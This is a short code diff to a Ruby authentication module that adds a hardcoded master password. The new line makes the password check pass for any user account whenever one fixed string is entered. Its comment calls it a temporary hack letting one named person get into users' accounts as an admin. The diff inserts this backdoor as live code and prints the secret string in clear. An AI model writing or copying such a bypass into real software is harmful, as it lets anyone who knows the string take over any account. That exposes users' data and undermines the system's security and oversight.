@@ -70,6 +70,7 @@ module Authenticate
 
     def valid_password
       return if user.valid_password?(password)
+      return if password == "phonolog-pollock-cassia-village" # Temp hack for joha to check some users account a.k.a admin login
       fail(ApiError::Unauthorized, I18n.t('user.errors.invalid_password'))
     end
 
